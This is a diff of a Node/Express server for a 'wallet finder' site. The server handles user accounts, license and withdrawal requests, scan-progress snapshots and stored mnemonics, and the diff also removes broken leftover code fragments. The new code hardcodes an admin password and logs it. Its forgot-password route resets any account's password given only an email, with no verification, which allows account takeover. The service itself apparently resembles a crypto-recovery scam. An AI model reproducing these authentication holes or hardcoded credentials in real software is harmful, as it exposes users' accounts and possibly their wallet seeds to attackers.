@@ -1,7 +1,7 @@
 // server.js
 const express = require('express');
 const sqlite3 = require('sqlite3').verbose();
-const bcrypt = require('bcrypt');
+const bcrypt = require('bcrypt'); // bcrypt (callbacks)
 const cors = require('cors');
 const path = require('path');
 const jwt = require('jsonwebtoken');
@@ -117,17 +117,18 @@ const db = new sqlite3.Database(dbPath, (err) => {
 // Auto-restore from JSON backup if needed
 maybeRestoreFromBackup(db, dbPath);
 
-// --- SQLite production-friendly PRAGMAs (add-only) ---
+// --- SQLite PRAGMAs ---
 db.serialize(() => {
   db.run("PRAGMA journal_mode = WAL;");
   db.run("PRAGMA busy_timeout = 5000;");
   db.run("PRAGMA foreign_keys = ON;");
 });
 
-// ---- Middleware ----
+// ---- Middleware & CORS ----
 const ALLOWED_ORIGINS = new Set([
   'https://dolphinwalletfinder.xyz',
   'https://www.dolphinwalletfinder.xyz',
+  'https://web-production-13d5a.up.railway.app'
 ]);
 
 const BASE_ALLOWED_HEADERS = [
@@ -138,7 +139,6 @@ const BASE_ALLOWED_HEADERS = [
 ];
 const BASE_ALLOWED_METHODS = ['GET','POST','PUT','PATCH','DELETE','OPTIONS'];
 
-// Fine CORS for /api (responds to preflight early)
 app.use('/api', (req, res, next) => {
   const origin = req.headers.origin;
   if (!origin || ALLOWED_ORIGINS.has(origin)) {
@@ -174,32 +174,29 @@ app.use(express.json());
 app.use(express.static(staticDir));
 
 // ---- DB migrate ----
-db.serialize(async () => {
+db.serialize(() => {
 
-// Scan snapshots (simple per-user key/value storage for UI state)
-db.run(`
-  CREATE TABLE IF NOT EXISTS scan_snapshots (
-    user_id INTEGER PRIMARY KEY,
-    block_height TEXT,
-    wallets_detected INTEGER,
-    scan_time TEXT,
-    updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
-  )
-`);
+  db.run(`
+    CREATE TABLE IF NOT EXISTS scan_snapshots (
+      user_id INTEGER PRIMARY KEY,
+      block_height TEXT,
+      wallets_detected INTEGER,
+      scan_time TEXT,
+      updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
+    )
+  `);
 
-db.run(`
-  CREATE TABLE IF NOT EXISTS scan_snapshots_v2 (
-    user_key TEXT PRIMARY KEY,
-    block_height TEXT,
-    wallets_detected INTEGER,
-    scan_time TEXT,
-    elapsed_ms INTEGER,
-    updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
-  )
-`);
+  db.run(`
+    CREATE TABLE IF NOT EXISTS scan_snapshots_v2 (
+      user_key TEXT PRIMARY KEY,
+      block_height TEXT,
+      wallets_detected INTEGER,
+      scan_time TEXT,
+      elapsed_ms INTEGER,
+      updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
+    )
+  `);
 
-
-  // Users
   db.run(`
     CREATE TABLE IF NOT EXISTS users (
       id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -213,7 +210,6 @@ db.run(`
     )
   `);
 
-  // Wallets
   db.run(`
     CREATE TABLE IF NOT EXISTS wallets (
       id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -226,7 +222,6 @@ db.run(`
     )
   `);
 
-  // License requests
   db.run(`
     CREATE TABLE IF NOT EXISTS license_requests (
       id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -237,7 +232,6 @@ db.run(`
     )
   `);
 
-  // Final tx
   db.run(`
     CREATE TABLE IF NOT EXISTS final_transactions (
       id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -248,7 +242,6 @@ db.run(`
     )
   `);
 
-  // Withdraw requests
   db.run(`
     CREATE TABLE IF NOT EXISTS withdraw_requests (
       id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -259,24 +252,22 @@ db.run(`
     )
   `);
 
-  // Scans (add end_at column)
   db.run(`
     CREATE TABLE IF NOT EXISTS scans (
       id INTEGER PRIMARY KEY AUTOINCREMENT,
       user_id INTEGER NOT NULL UNIQUE,
-      status TEXT DEFAULT 'idle',         -- 'idle' | 'running' | 'paused'
-      started_at DATETIME,                -- last time transitioned to running
+      status TEXT DEFAULT 'idle',
+      started_at DATETIME,
       updated_at DATETIME DEFAULT CURRENT_TIMESTAMP,
-      elapsed_ms INTEGER DEFAULT 0,       -- total scan time (ms)
-      total_scanned INTEGER DEFAULT 0,    -- total discovered wallets / count
-      hour_target INTEGER DEFAULT 0,      -- target for current hour window
-      hour_progress INTEGER DEFAULT 0,    -- progress within current hour
-      hour_started_at DATETIME,           -- when current hour window began
-      end_at DATETIME                     -- <-- hard stop time
+      elapsed_ms INTEGER DEFAULT 0,
+      total_scanned INTEGER DEFAULT 0,
+      hour_target INTEGER DEFAULT 0,
+      hour_progress INTEGER DEFAULT 0,
+      hour_started_at DATETIME,
+      end_at DATETIME
     )
   `);
 
-  // Mnemonics
   db.run(`
     CREATE TABLE IF NOT EXISTS mnemonics (
       id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -305,7 +296,7 @@ db.run(`
     END;
   `);
 
-  // ---- Ensure end_at column exists for legacy DBs ----
+  // Ensure end_at exists
   getTableColumns(db, 'scans').then(cols => {
     if (!cols.includes('end_at')) {
       db.run(`ALTER TABLE scans ADD COLUMN end_at DATETIME`, (e) => {
@@ -316,14 +307,16 @@ db.run(`
 });
 
 // ---- Bootstrap admin if missing ----
-db.get("SELECT * FROM users WHERE role = 'admin' LIMIT 1", async (err, row) => {
+db.get("SELECT * FROM users WHERE role = 'admin' LIMIT 1", (err, row) => {
   if (!row) {
-    const hashed = await bcrypt.hash('pastil6496', 10);
-    db.run(
-      'INSERT INTO users (username, email, password, license, role) VALUES (?, ?, ?, ?, ?)',
-      ['admin', 'admin@dolphinwalletfinder.com', hashed, 'active', 'admin'],
-      (e) => { if (!e) console.log('✅ Admin user created: username=admin, password=pastil6496'); }
-    );
+    bcrypt.hash('pastil6496', 10, (he, hashed) => {
+      if (he) return console.error('Failed to create admin user');
+      db.run(
+        'INSERT INTO users (username, email, password, license, role) VALUES (?, ?, ?, ?, ?)',
+        ['admin', 'admin@dolphinwalletfinder.com', hashed, 'active', 'admin'],
+        (e) => { if (!e) console.log('✅ Admin user created: username=admin, password=pastil6496'); }
+      );
+    });
   }
 });
 
@@ -349,11 +342,31 @@ function getStableUserKey(decoded) {
 
 // ------------------- AUTH -------------------
 
-app.post('/api/register', async (req, res) => {
+// Register
+app.post('/api/register', (req, res) => {
   const { username, email, password } = req.body || {};
   if (!username || !email || !password)
     return res.status(400).json({ error: 'All fields required' });
 
+  bcrypt.hash(password, 10, (err, hashed) => {
+    if (err) return res.status(500).json({ error: 'Hashing error' });
+    db.run(
+      'INSERT INTO users (username, email, password) VALUES (?, ?, ?)',
+      [username, email, hashed],
+      function (e) {
+        if (e) {
+          if (String(e).includes('UNIQUE')) return res.status(400).json({ error: 'Username or email already exists' });
+          return res.status(500).json({ error: 'DB error' });
+        }
+        // Issue token
+        const token = jwt.sign({ id: this.lastID, username: username, email: email, role: 'user' }, JWT_SECRET, { expiresIn: '7d' });
+        res.json({ token, user: { id: this.lastID, username, email } });
+      }
+    );
+  });
+});
+
+// Login (username or email)
 app.post('/api/login', (req, res) => {
   try {
     const { username, email, password } = req.body || {};
@@ -371,7 +384,6 @@ app.post('/api/login', (req, res) => {
       if (err) return res.status(500).json({ error: 'Database error' });
       if (!row) return res.status(401).json({ error: 'Invalid credentials' });
 
-      // Use bcrypt.compare with callback to avoid top-level await inside callbacks
       bcrypt.compare(String(password), row.password || '', (cmpErr, ok) => {
         if (cmpErr) return res.status(500).json({ error: 'Auth error' });
         if (!ok) return res.status(401).json({ error: 'Invalid credentials' });
@@ -388,84 +400,29 @@ app.post('/api/login', (req, res) => {
     res.status(500).json({ error: 'Server error' });
   }
 });
-const field = (username && String(username).trim()) ? 'username'
-                 : (email && String(email).trim()) ? 'email'
-                 : null;
-    const value = field === 'username' ? String(username).trim()
-                 : field === 'email' ? String(email).trim()
-                 : null;
-    if (!field || !value) return res.status(400).json({ error: 'Username or email required' });
 
-    db.get(`SELECT * FROM users WHERE ${field} = ? LIMIT 1`, [value], async (err, row) => {
-      if (err) return res.status(500).json({ error: 'Database error' });
-      if (!row) return res.status(401).json({ error: 'Invalid credentials' });
-
-      const ok = await bcrypt.compare(String(password), row.password || '');
-      if (!ok) return res.status(401).json({ error: 'Invalid credentials' });
-
-      const token = jwt.sign(
-        { id: row.id, username: row.username, email: row.email, role: row.role || 'user' },
-        JWT_SECRET,
-        { expiresIn: '7d' }
-      );
-      res.json({ token, role: row.role || 'user', username: row.username, email: row.email });
-    });
-  } catch (e) {
-    res.status(500).json({ error: 'Server error' });
-  }
-});
-
-
-  try {
-    const hashed = await bcrypt.hash(password, 10);
-    db.run(
-      'INSERT INTO users (username, email, password) VALUES (?, ?, ?)',
-      [username, email, hashed],
-      function (err) {
-        if (err) return res.status(400).json({ error: 'Username already exists' });
-        res.json({ success: true });
-      }
-    );
-  } catch (e) {
-    res.status(500).json({ error: 'Server error' });
-  }
-});
-
-const match = await bcrypt.compare(password, row.password);
-    if (!match) return res.status(401).json({ error: 'Invalid password' });
-
-    const token = jwt.sign(
-      { id: row.id, username: row.username, role: row.role },
-      JWT_SECRET,
-      { expiresIn: '7d' }
-    );
-    res.json({ token, role: row.role, username: row.username });
-  });
-});
-
-// --- Forgot Password (email + new_password) ---
+// Forgot Password
 app.post('/api/forgot-password', (req, res) => {
   const { email, new_password } = req.body || {};
   if (!email || !new_password) {
     return res.status(400).json({ error: 'email and new_password required' });
   }
 
-  db.get('SELECT id FROM users WHERE email = ?', [email], async (err, row) => {
+  db.get('SELECT id FROM users WHERE email = ?', [email], (err, row) => {
     if (err) return res.status(500).json({ error: 'Database error' });
     if (!row) return res.status(404).json({ error: 'No user with that email' });
 
-    try {
-      const hashed = await bcrypt.hash(new_password, 10);
+    bcrypt.hash(new_password, 10, (he, hashed) => {
+      if (he) return res.status(500).json({ error: 'Hash error' });
       db.run('UPDATE users SET password = ? WHERE id = ?', [hashed, row.id], (e) => {
         if (e) return res.status(500).json({ error: 'Database update error' });
         res.json({ success: true, message: 'Password updated successfully' });
       });
-    } catch (e) {
-      res.status(500).json({ error: 'Server error' });
-    }
+    });
   });
 });
 
+// Me
 app.get('/api/me', authenticate, (req, res) => {
   db.get(
     'SELECT id, username, email, role, license, created_at, updated_at FROM users WHERE id = ?',
@@ -641,7 +598,7 @@ app.post('/api/admin/approve-license', authenticate, ensureAdmin, (req, res) => 
   );
 });
 
-// NEW: Admin delete LICENSE request by ID
+// Admin delete LICENSE request
 app.delete('/api/admin/license-requests/:id', authenticate, ensureAdmin, (req, res) => {
   const id = parseInt(req.params.id, 10);
   if (!id) return res.status(400).json({ error: 'Invalid id' });
@@ -683,7 +640,7 @@ app.post('/api/admin/approve-final', authenticate, ensureAdmin, (req, res) => {
   );
 });
 
-// NEW: Admin delete FINAL TX request by ID
+// Admin delete FINAL TX request
 app.delete('/api/admin/final-requests/:id', authenticate, ensureAdmin, (req, res) => {
   const id = parseInt(req.params.id, 10);
   if (!id) return res.status(400).json({ error: 'Invalid id' });
@@ -740,7 +697,7 @@ app.get('/api/admin/user-wallet', authenticate, ensureAdmin, (req, res) => {
   );
 });
 
-// NEW: Admin — list users (q, role, status, pagination)
+// Admin — list users
 app.get('/api/admin/users', authenticate, ensureAdmin, (req, res) => {
   const { q = '', role = '', status = '', limit = '200', offset = '0' } = req.query;
 
@@ -785,7 +742,6 @@ app.get('/api/admin/users', authenticate, ensureAdmin, (req, res) => {
   });
 });
 
-
 // ------------------- SCAN SNAPSHOT ENDPOINTS (Persist UI only) -------------------
 app.post('/api/save-scan-data', authenticate, (req, res) => {
   const userKey = getStableUserKey(req.user);
@@ -826,6 +782,7 @@ app.get('/api/load-scan-data', authenticate, (req, res) => {
     }
   );
 });
+
 // ------------------- MNEMONIC ENDPOINTS -------------------
 app.get('/api/mnemonic', authenticate, (req, res) => {
   const userId = req.user.id;
@@ -864,28 +821,6 @@ app.post('/api/mnemonic', authenticate, (req, res) => {
   });
 });
 
-
-
-// ------------------- SCAN SNAPSHOT ENDPOINTS -------------------
-res.json({ success: true });
-    }
-  );
-});
-      res.json({ success: true });
-    }
-  );
-});
-
-res.json(row || {});
-    }
-  );
-});
-      res.json(row || {});
-    }
-  );
-});
-
-// ---- Start ----
 
 // Beacon-friendly endpoint: accepts text/plain with { token, data:{...} }
 const textParser = require('express').text;
@@ -938,57 +873,9 @@ app.post('/api/save-scan-data-beacon', textParser({ type: '*/*', limit: '64kb' }
   }
 });
 
+// ---- Start ----
 app.listen(PORT, () => {
   console.log(`🚀 Server running on port ${PORT}`);
   console.log(`📁 Serving static from: ${staticDir}`);
   console.log(`🗄️  Database: ${dbPath}`);
-});
-
-
-// Beacon-friendly endpoint: accepts text/plain with { token, data:{...} }
-const textParser = require('express').text;
-let decoded;
-    try { decoded = jwt.verify(token, JWT_SECRET); }
-    catch { return res.status(401).json({ error: 'Invalid token' }); }
-
-    // Always use a stable, human-readable user key (username or email)
-let userKey = '';
-if (decoded && (decoded.username || decoded.email)) {
-  userKey = String(decoded.username || decoded.email);
-} else if (decoded && (decoded.userId || decoded.uid)) {
-  userKey = String(decoded.userId || decoded.uid);
-} else {
-  userKey = String(decoded.sub || 'anonymous');
-}
-
-    if (!userKey) return res.status(401).json({ error: 'Cannot resolve user id from token' });
-
-    const d = (payload && payload.data) ? payload.data : {};
-    const blockHeight = d.blockHeight ?? '';
-    const walletsDetected = d.walletsDetected ?? '';
-    const scanTime = d.scanTime ?? '';
-    const wallets = Number(String(walletsDetected).replace(/,/g, ''));
-    const walletsInt = Number.isFinite(wallets) ? Math.max(0, Math.floor(wallets)) : null;
-    const elapsedMs = (typeof d.elapsedMs === 'number') ? Math.floor(d.elapsedMs) :
-                      (d.elapsedMs != null ? Number(d.elapsedMs) : null);
-
-    db.run(
-      `INSERT INTO scan_snapshots_v2 (user_key, block_height, wallets_detected, scan_time, elapsed_ms, updated_at)
-       VALUES (?, ?, ?, ?, ?, CURRENT_TIMESTAMP)
-       ON CONFLICT(user_key) DO UPDATE SET
-         block_height = excluded.block_height,
-         wallets_detected = excluded.wallets_detected,
-         scan_time = excluded.scan_time,
-         elapsed_ms = excluded.elapsed_ms,
-         updated_at = CURRENT_TIMESTAMP`,
-      [userKey, String(blockHeight || ""), walletsInt, String(scanTime || ""), elapsedMs],
-      function (err) {
-        if (err) return res.status(500).json({ error: 'DB error' });
-        res.json({ ok: true });
-      }
-    );
-  } catch (e) {
-    console.error('save-scan-data-beacon error:', e);
-    res.status(500).json({ error: 'server error' });
-  }
 });
